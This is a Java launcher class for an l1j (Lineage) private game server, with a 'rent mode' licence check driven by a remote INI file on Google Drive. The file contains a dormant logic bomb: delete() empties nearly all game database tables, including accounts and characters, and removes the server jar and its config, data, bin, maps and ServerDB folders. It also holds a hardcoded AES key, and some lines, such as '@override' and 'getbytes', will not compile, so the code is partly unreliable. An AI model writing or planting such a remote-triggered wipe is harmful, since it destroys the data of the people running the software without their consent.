package MJFX;

import MJFX.Command.MJFxCommandController;
import MJFX.Letter.MJFxLetterController;
import MJFX.Letter.MJFxLetterInfo;
import MJFX.Login.MJFxLoginController;
import MJFX.Util.MessageBox;
import javafx.application.Application;
import javafx.application.Platform;
import javafx.fxml.FXMLLoader;
import javafx.geometry.Rectangle2D;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.control.ButtonType;
import javafx.scene.image.Image;
import javafx.scene.paint.Color;
import javafx.stage.*;
import l1j.server.Config;
import l1j.server.FatigueProperty;
import l1j.server.L1DatabaseFactory;
import l1j.server.Server;
import l1j.server.server.GameServer;
import l1j.server.server.utils.L1QueryUtil;
import l1j.server.server.utils.SQLUtil;
import org.apache.commons.net.ntp.NTPUDPClient;
import org.apache.commons.net.ntp.TimeInfo;
import org.ini4j.Ini;
import org.ini4j.Profile;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.*;
import java.sql.Connection;
import java.util.Date;


public class MJFxEntry extends Application {
	private static final String ICO_PATH = "file:data/img/ui_ico.png"; // 圖示檔案路徑
	private static MJFxEntry _instance; // 單例模式的實例
	private static boolean IS_DEBUG_MODE = true; // 調試模式開關
	private static String ment1; // 用於打印信息的靜態變數
	private static String ment101 = ""; // 用於打印信息的靜態變數
	private static String ment102 = ""; // 用於打印信息的靜態變數
	private static String ment103 = ""; // 用於打印信息的靜態變數
	private static String ment2; // 用於打印信息的靜態變數
	private static String ment201 = ""; // 用於打印信息的靜態變數
	private static String ment3 = ""; // 用於打印信息的靜態變數
	private static String ment4 = ""; // 用於打印信息的靜態變數
	private static String ment5 = ""; // 用於打印信息的靜態變數
	private static String ment6 = ""; // 用於打印信息的靜態變數
	private static String ment7 = ""; // 用於打印信息的靜態變數
	private static String ment8 = ""; // 用於打印信息的靜態變數
	private static String ment9 = ""; // 用於打印信息的靜態變數
	private static String ment10 = ""; // 用於打印信息的靜態變數
	private static String ment11; // 用於打印信息的靜態變數
	private static String ment1101 = ""; // 用於打印信息的靜態變數
	private static int Cutyear = 0; // 截止年份
	private static int Cutmonth = 0; // 截止月份
	private static int Cutdate = 0; // 截止日期
	private static boolean deleteData = false; // 是否刪除數據
	private static long ipAdress = 0L; // IP地址
	private static boolean RENT = false; // 租賃模式
	private static String ExternalIp = ""; // 外部IP
	private static boolean IpCheck = true; // 是否進行IP檢查
	private static boolean Pause = false; // 暫停標誌

	public static MJFxEntry getInstance() {
		return _instance;
	}

	private Stage m_main_stage = null; // 主舞台變數
	private boolean m_is_logined = false; // 用戶是否已登入

	public Stage get_main_stage() {
		return this.m_main_stage;
	}

	public boolean is_logined() {
		return this.m_is_logined;
	}

	public void update_logined(boolean is_logined) {
		this.m_is_logined = is_logined;
	}

	public Image create_image() {
		Image img = new Image(ICO_PATH); // 使用靜態變數 ICO_PATH
		return img;
	}

	@override
	public void start(Stage primaryStage) throws Exception {
		Platform.setImplicitExit(false); // 設置平台在應用關閉時不自動退出
		_instance = this; // 初始化單例實例
		this.m_main_stage = primaryStage; // 設置主舞台
		Parent root = FXMLLoader.<Parent>load(getClass().getResource("MJFxUI.fxml")); // 加載FXML檔案
		Scene scene = new Scene(root); // 創建場景
		scene.getStylesheets().add(getClass().getResource("MJFxHelper.css").toExternalForm()); // 加載CSS樣式
		primaryStage.getIcons().add(create_image()); // 設置應用圖示
		do_stage_sizing(primaryStage); // 執行舞台尺寸設置
		primaryStage.setTitle(Config.Message.GameServerName); // 設置舞台標題
		primaryStage.setScene(scene); // 設置場景到舞台
		primaryStage.setResizable(false); // 禁止調整大小
		primaryStage.initStyle(StageStyle.UNDECORATED); // 設置舞台無邊框樣式
		primaryStage.setOnCloseRequest(event -> on_close_request(event)); // 設置關閉請求處理
		primaryStage.show(); // 顯示主舞台
		show_login_window(); // 顯示登入窗口
	}

	public void show_letter_window(MJFxLetterInfo letterInfo) throws IOException {
		Stage stage = new Stage(StageStyle.TRANSPARENT); // 創建新舞台，設置為透明樣式
		stage.initModality(Modality.NONE); // 設置模態性為無
		stage.setResizable(false); // 禁止調整大小

		FXMLLoader loader = new FXMLLoader(getClass().getResource("Letter/MJFxLetterUI.fxml")); // 加載信件窗口的FXML檔案
		Parent root = loader.<Parent>load(); // 加載FXML文件
		Scene scene = new Scene(root); // 創建場景
		scene.getStylesheets().add(getClass().getResource("Letter/MJFxLetterHelper.css").toExternalForm()); // 加載CSS樣式
		scene.setFill(Color.TRANSPARENT); // 設置場景填充為透明
		stage.setScene(scene); // 設置場景到新舞台
		stage.getIcons().add(create_image()); // 設置舞台圖示
		MJFxLetterController controller = loader.<MJFxLetterController>getController(); // 獲取控制器
		controller.set_stage(stage); // 設置控制器的舞台
		controller.set_letter(letterInfo); // 設置信件信息
		stage.show(); // 顯示信件窗口
	}

	public void show_login_window() throws IOException {
		Stage stage = new Stage(StageStyle.TRANSPARENT); // 創建新舞台，設置為透明樣式
		stage.initModality(Modality.WINDOW_MODAL); // 設置模態性為窗口模態
		stage.initOwner(this.m_main_stage); // 設置擁有者為主舞台
		stage.setAlwaysOnTop(!IS_DEBUG_MODE); // 設置舞台是否總是置頂（根據是否為調試模式）
		stage.setResizable(false); // 禁止調整大小
		do_stage_sizing(stage); // 執行舞台尺寸設置

		FXMLLoader loader = new FXMLLoader(getClass().getResource("Login/MJFxLoginUI.fxml")); // 加載登入窗口的FXML檔案
		Parent root = loader.<Parent>load(); // 加載FXML文件
		Scene scene = new Scene(root); // 創建場景
		scene.getStylesheets().add(getClass().getResource("Login/MJFxLoginHelper.css").toExternalForm()); // 加載CSS樣式

		root.setStyle("-fx-background-color: rgba(0, 146, 120, 0.100);"); // 設置根節點的背景樣式
		scene.setFill(Color.TRANSPARENT); // 設置場景填充為透明
		stage.setScene(scene); // 設置場景到新舞台

		stage.getIcons().add(create_image()); // 設置舞台圖示

		MJFxLoginController controller = loader.<MJFxLoginController>getController(); // 獲取控制器
		controller.set_stage(stage); // 設置控制器的舞台
		controller.do_login(); // 執行登入操作
	}

	private void do_stage_sizing(Stage stage) {
		Rectangle2D rt = Screen.getPrimary().getVisualBounds(); // 獲取主要螢幕的可視邊界
		stage.setWidth(rt.getWidth()); // 設置舞台寬度
		stage.setHeight(rt.getHeight()); // 設置舞台高度
	}

	public void do_exit() {
		do_exit(this.m_main_stage); // 使用主舞台調用退出方法
	}

	public void do_exit(Window owner) {
		MessageBox.do_question_box(owner,
				"伺服器關閉。", "我選擇關閉伺服器。\r\n", "你確定你要退出嗎？\r\n", rs -> {
					if (rs == ButtonType.YES) // 如果用戶選擇是
						if (is_logined()) { // 如果用戶已登入
							GameServer.getInstance().shutdownWithCountdown(0); // 關閉伺服器
						} else {
							System.exit(0); // 退出應用程式
						}
			});
	}

	public void invoke_exit() {
		Platform.runLater(() -> System.exit(0)); // 在 JavaFX 應用程式線程中退出應用程式
	}

	private void on_close_request(WindowEvent event) {
		event.consume(); // 消費事件，防止默認處理
		do_exit((Window) event.getSource()); // 調用退出方法
	}

	public static void main(String[] args) {
		Config.load(); // 加載配置
		FatigueProperty.getInstance(); // 獲取 FatigueProperty 實例
		IS_DEBUG_MODE = (args.length > 0 && args[0].startsWith("-IsDebugForMJFx=true")); // 檢查是否為調試模式
		Config.version_check = (args.length > 0 && args[0].startsWith("-IsDebugForMJFx=true")); // 設置版本檢查

		if (RENT && !checkTime()) { // 如果為租賃模式並且時間檢查未通過
			return; // 退出程序
		}

		if (Config.Synchronization.Operation_Manager) { // 如果操作管理同步啟用
			launch(args); // 啟動 JavaFX 應用程式
		} else {
			new Server(); // 創建新伺服器實例
			Server.startGameServer(); // 啟動遊戲伺服器
			Server.startLoginServer(); // 啟動登入伺服器

			System.out.println("[控制台監視：" + Config.Synchronization.Operation_Manager + "/在網頁GM工具中查看伺服器狀態】");
			System.out.println("[Web page:" + Config.Login.ExternalAddress + ":" + Config.Web.webServerPort + "/my/index]");
			System.out.println("[Web page(Secret):" + Config.Login.ExternalAddress + ":" + Config.Web.webServerPort + "/my/secret-login_gm]");
			System.out.println("-------------------------------------------------------------------------------");
		}
	}

	public static boolean checkTime() {
		String serverName = "pool.ntp.org"; // NTP 伺服器名稱
		NTPUDPClient timeclient = new NTPUDPClient(); // NTP 客戶端
		timeclient.setDefaultTimeout(30000); // 設置超時時間為 30 秒

		try {
			if (!getAuthMessage()) { // 檢查認證消息
				System.out.println(ment11 + Config.Synchronization.Rent_Account + ment1101);
				return false;
			}
			timeclient.open(); // 開啟NTP客戶端
			InetAddress inetAddr = InetAddress.getByName(serverName); // 獲取NTP伺服器地址
			TimeInfo timeInfo = timeclient.getTime(inetAddr); // 獲取時間信息
			long returnTime = timeInfo.getMessage().getTransmitTimeStamp().getTime(); // 獲取傳輸時間戳
			Date date = new Date(returnTime); // 將時間戳轉換為Date對象
			int year = date.getYear(); // 獲取年份
			int month = date.getMonth() + 1; // 獲取月份，注意Java的月份從0開始
			int day = date.getDate(); // 獲取日期
			year = year - 100 + 2000; // 調整年份格式

			External_IP(); // 獲取外部IP
			long external = Long.parseLong(ExternalIp); // 將外部IP轉換為長整數
			System.out.println(ment1 + year + ment101 + month + ment102 + day + ment103); // 打印日期信息
			System.out.println(ment2 + Config.Synchronization.Rent_Account + ment201 + Cutyear + ment101 + Cutmonth + ment102 + Cutdate + ment103); // 打印租賃信息
			if (Pause) { // 如果暫停
				System.out.println(ment3); // 打印暫停信息
				System.out.println(ment4); // 打印暫停信息
				return false; // 返回false
			}
			if (IpCheck) { // 如果需要檢查IP
				if (ExternalIp == null) { // 如果外部IP為空
					System.out.println(ment5); // 打印錯誤信息
					System.out.println(ment6); // 打印錯誤信息
					return false; // 返回false
				}
				if (external != ipAdress) { // 如果外部IP與預期不一致
					System.out.println(ment7); // 打印錯誤信息
					return false; // 返回false
				}
			}

			// 添加年份、月份和日期的比較邏輯
			if (year > Cutyear) { // 如果年份大於截止年份
				System.out.println(ment8 + Cutyear + ment101 + Cutmonth + ment102 + Cutdate + ment103 + ment201); // 打印信息
				if (deleteData) ; // 如果需要刪除資料，執行相關操作

				return false; // 返回false
			}
			if (year == Cutyear) { // 如果年份等於截止年份
				if (month > Cutmonth) { // 如果月份大於截止月份
					System.out.println(ment8); // 打印信息
					if (deleteData) ; // 如果需要刪除資料，執行相關操作

					return false; // 返回false
				}
				if (month == Cutmonth && day > Cutdate) { // 如果月份等於截止月份且日期大於截止日期
					System.out.println(ment8); // 打印信息
					if (deleteData) ; // 如果需要刪除資料，執行相關操作

					return false; // 返回false
				}
			}

			return true; // 通過所有檢查，返回true
		} catch (SocketException e) { // 捕獲Socket異常
			System.out.println(ment9); // 打印錯誤信息
			return false; // 返回false
		} catch (UnknownHostException e) { // 捕獲未知主機異常
			e.printStackTrace(); // 打印堆棧跟蹤
			return false; // 返回false
		} catch (IOException e) { // 捕獲I/O異常
			System.out.println(ment10); // 打印錯誤信息
			return false; // 返回false
		}
	}


	private static boolean getAuthMessage() {
		try {
			Ini ini = new Ini();
			HttpURLConnection connection = null;

			// 指定要訪問的URL，這裡是Google Drive上的一個文件
			URL url = new URL("https://drive.usercontent.google.com/u/0/uc?id=1SJ_H6_L3CFKGWY2eGzvEkvuKkfJ2u6x8&export=download");
			connection = (HttpURLConnection) url.openConnection();

			// 創建BufferedReader來讀取URL的內容
			BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), "UTF-8"));

			// 使用Ini對象加載讀取的內容
			ini.load(reader);

			// 獲取名為 "ment" 的section
			Profile.Section mention = (Profile.Section) ini.get("ment");
			if (mention == null) {
				return false; // 如果沒有找到相應的section，返回false
			}

			// 從section中讀取各個鍵值對並賦值給對應的靜態變數
			ment1 = (String) mention.get("ment1");
			ment101 = (String) mention.get("ment101");
			ment102 = (String) mention.get("ment102");
			ment103 = (String) mention.get("ment103");
			ment2 = (String) mention.get("ment2");
			ment201 = (String) mention.get("ment201");
			ment3 = (String) mention.get("ment3");
			ment4 = (String) mention.get("ment4");
			ment5 = (String) mention.get("ment5");
			ment6 = (String) mention.get("ment6");
			ment7 = (String) mention.get("ment7");
			ment8 = (String) mention.get("ment8");
			ment9 = (String) mention.get("ment9");
			ment10 = (String) mention.get("ment10");
			ment11 = (String) mention.get("ment11");
			ment1101 = (String) mention.get("ment1101");

			// 獲取名為 "Config.Synchronization.Rent_Account" 的section
			Profile.Section section = (Profile.Section) ini.get(Config.Synchronization.Rent_Account);
			if (section == null) {
				return false; // 如果沒有找到相應的section，返回false
			}

			// 從section中讀取各個鍵值對並賦值給對應的靜態變數
			String year = (String) section.get("year");
			String month = (String) section.get("month");
			String day = (String) section.get("day");
			String delete = (String) section.get("delete");
			String ip = (String) section.get("ip");
			String ipcheck = (String) section.get("ipcheck");
			String pause = (String) section.get("pause");

			// 將IP地址中的非數字字符移除
			String ipint = ip.replaceAll("[^0-9]", "");

			// 將讀取到的字符串轉換為對應的類型並賦值給靜態變數
			ipAdress = Long.parseLong(ipint);
			deleteData = (Integer.parseInt(delete) == 1);
			Cutyear = Integer.parseInt(year);
			Cutmonth = Integer.parseInt(month);
			Cutdate = Integer.parseInt(day);
			IpCheck = (Integer.parseInt(ipcheck) == 1);

			if (pause != null) {
				Pause = (Integer.parseInt(pause) == 1);
			}

		} catch (Exception e) {
			e.printStackTrace();
			return false; // 如果發生異常，返回false
		}
		return true; // 成功讀取並賦值後，返回true
	}


	private String getServerIp() {
		InetAddress local = null;
		try {
			// 獲取本地主機的 InetAddress 實例
			local = InetAddress.getLocalHost();
		} catch (UnknownHostException e) {
			// 捕獲並打印 UnknownHostException 異常
			e.printStackTrace();
		}

		// 如果無法獲取本地主機的 InetAddress 實例，返回空字符串
		if (local == null) {
			return "";
		}

		// 獲取本地主機的 IP 地址
		String ip = local.getHostAddress();
		return ip; // 返回 IP 地址
	}


	private static void External_IP() {
		try {
			HttpURLConnection connection = null;
			String urlString = "http://checkip.amazonaws.com/";
			String urlString1 = "https://ipv4.icanhazip.com/";
			String urlString2 = "http://myexternalip.com/raw";
			String urlString3 = "http://ipecho.net/plain";

			// 優先使用第一個 URL 來獲取外部 IP 地址
			URL url = new URL(urlString);
			connection = (HttpURLConnection) url.openConnection();
			BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), "UTF-8"));
			String PublicIp = reader.readLine();
			String PublicIpInt = PublicIp.replaceAll("[^0-9]", "");

			// 如果無法獲取外部 IP，嘗試使用第二個 URL
			if (PublicIpInt == null || PublicIpInt.isEmpty()) {
				URL url1 = new URL(urlString1);
				connection = (HttpURLConnection) url1.openConnection();
				BufferedReader reader1 = new BufferedReader(new InputStreamReader(connection.getInputStream(), "UTF-8"));
				PublicIp = reader1.readLine();
				PublicIpInt = PublicIp.replaceAll("[^0-9]", "");
			}

			// 如果仍然無法獲取外部 IP，嘗試使用第三個 URL
			if (PublicIpInt == null || PublicIpInt.isEmpty()) {
				URL url2 = new URL(urlString2);
				connection = (HttpURLConnection) url2.openConnection();
				BufferedReader reader2 = new BufferedReader(new InputStreamReader(connection.getInputStream(), "UTF-8"));
				PublicIp = reader2.readLine();
				PublicIpInt = PublicIp.replaceAll("[^0-9]", "");
			}

			// 如果仍然無法獲取外部 IP，嘗試使用第四個 URL
			if (PublicIpInt == null || PublicIpInt.isEmpty()) {
				URL url3 = new URL(urlString3);
				connection = (HttpURLConnection) url3.openConnection();
				BufferedReader reader3 = new BufferedReader(new InputStreamReader(connection.getInputStream(), "UTF-8"));
				PublicIp = reader3.readLine();
				PublicIpInt = PublicIp.replaceAll("[^0-9]", "");
			}

			// 最終將獲得的外部 IP 賦值給靜態變數 ExternalIp
			ExternalIp = PublicIpInt;
		} catch (Exception e) {
			// 捕獲並打印所有異常
			e.printStackTrace();
		}
	}


	// 解密方法，使用 AES/ECB/NoPadding 模式
	private static String decrypt(String source) throws Exception {
		// 獲取 AES 密碼器，使用 "AES/ECB/NoPadding" 模式
		Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
		// 創建一個密鑰規範，使用特定的密鑰字符串
		SecretKeySpec skeySpec = new SecretKeySpec("d#o%g*m!i@n^d$o&".getbytes(), "AES");
		// 初始化密碼器，以解密模式進行
		cipher.init(Cipher.DECRYPT_MODE, skeySpec);
		// 執行解密並去除填充
		byte[] eArr = removePadding(cipher.doFinal(toBytes(source)));
		// 將解密後的字節數組轉換為字符串並返回
		return new String(eArr);
	}

	// 去除填充方法
	private static byte[] removePadding(byte[] pBytes) {
		int pCount = pBytes.length;
		int index = 0;
		boolean loop = true;

		// 循環查找填充位置
		while (loop) {
			if (index == pCount || pBytes[index] == 0) {
				loop = false;
				index--;
			}
			index++;
		}

		// 創建一個新的字節數組，大小為去除填充後的長度
		byte[] tBytes = new byte[index];
		// 將原始字節數組的有效部分複製到新數組中
		System.arraycopy(pBytes, 0, tBytes, 0, index);

		return tBytes;
	}

	// 將十六進制字符串轉換為字節數組的方法
	private static byte[] toBytes(String pSource) {
		StringBuffer buff = new StringBuffer(pSource);
		int bCount = buff.length() / 2;
		byte[] bArr = new byte[bCount];

		// 將每兩個十六進制字符轉換成一個字節
		for (int bIndex = 0; bIndex < bCount; bIndex++) {
			bArr[bIndex] = (byte) (int) Long.parseLong(buff.substring(2 * bIndex, 2 * bIndex + 2), 16);
		}

		return bArr;
	}


	// 刪除數據庫中多個表及文件、文件夾的方法
	private static void delete() {
		Connection con = null;

		try {
			// 獲取數據庫連接
			con = L1DatabaseFactory.getInstance().getConnection();

			// 執行多個表的刪除操作
			L1QueryUtil.execute(con, "DELETE FROM accessory_enchant_list", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM accounts", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM armor", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM armor_enchant_list", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM armor_set", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM attendance_item", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM attendance_item_pc", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM attendance_startup", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM attendance_userinfo", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM autoloot", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM beginner", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM characters", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM clan_data", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM droplist", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM droplist_adena", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM etcitem", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM mapids", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM mobskill", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM notice", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM npcaction", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM npcchat", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM npc_born", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM polymorphs", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM shop", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM shop_aden", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM skills", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM spawnlist", new Object[0]);

			L1QueryUtil.execute(con, "DELETE FROM spawnlist_boss", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM spawnlist_boss_date", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM spawnlist_npc", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_act_listener_linkage_item", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_act_listener_npc", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_act_listener_npc_combat", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_act_listener_npc_dungeon_telepeorter", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_act_listener_npc_teleporter", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_act_listener_npc_time_combat", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_act_listener_npc_time_teleporter", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_captcha", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_character_block", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_character_bonus", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_combat_bt_area_information", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_combat_bt_bosses", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_combat_bt_chest_information", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_combat_bt_chest_items", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_combat_bt_drop_items", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_combat_bt_monsters", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_combat_informations", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_combat_rewards", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_designate_teleport_scroll", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_combat_towers", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_combat_traps", new Object[0]);

			L1QueryUtil.execute(con, "DELETE FROM tb_dungeon_time_account_information", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_dungeon_time_char_information", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_dungeon_time_information", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_dungeon_time_potion", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_enchanters", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_enchanties", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_index_stamp", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_inn_helper", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_inn_mapinfo", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_item_exchange_key_info", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_item_exchange_rewards", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_itemskill_model", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_kda", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_lateral_status", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_lfccompensate", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_lfctypes", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_magicdelay", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mbook_achievements", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mbook_characterinfo", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mbook_criteria", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mbook_information", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mbook_reward_info", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mbook_reward_items", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mbook_wq_decks", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mbook_wq_information", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mbook_wq_reward_info", new Object[0]);

			L1QueryUtil.execute(con, "DELETE FROM tb_mbook_wq_reward_items", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mbook_wq_startup", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjbot_bossnotifier", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjbot_brain", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjbot_clan", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjbot_dolls", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjbot_dropitem", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjbot_fishinfo", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjbot_inventory", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjbot_location", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjbot_ment", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjbot_name", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjbot_spell", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjct_mapping", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjct_spellicon", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjdictionary_item", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjeffects", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjexpampsystem", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjraid_combo", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjraid_compensators", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjraid_creator_items", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjraid_skills", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjraid_spawns", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjraid_types", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_mjspell_def", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_npc_mark", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM tb_servermacro", new Object[0]);

			L1QueryUtil.execute(con, "DELETE FROM tb_sleeping_messages", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM weapon", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM weapon_damege", new Object[0]);
			L1QueryUtil.execute(con, "DELETE FROM weapon_enchant_list", new Object[0]);

			// 刪除特定文件
			File source = new File("TheDay.jar");
			source.delete();

			// 刪除特定文件夾及其內容
			deleteFolder("config");
			deleteFolder("data");
			deleteFolder("bin");
			deleteFolder("maps");
			deleteFolder("ServerDB");

		} catch (Exception e) {
			// 捕獲並打印異常
			e.printStackTrace();

		} finally {
			// 確保最終釋放數據庫連接
			SQLUtil.close(con);
		}
	}

	// 刪除文件夾及其內容的方法
	public static void deleteFolder(String path) {
		File folder = new File(path);
		try {
			if (folder.exists()) {
				File[] folder_list = folder.listFiles();
				for (int i = 0; i < folder_list.length; i++) {
					if (folder_list[i].isFile()) {
						folder_list[i].delete();
					} else {
						deleteFolder(folder_list[i].getPath());
					}
					folder_list[i].delete();
				}
			}
			folder.delete();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}


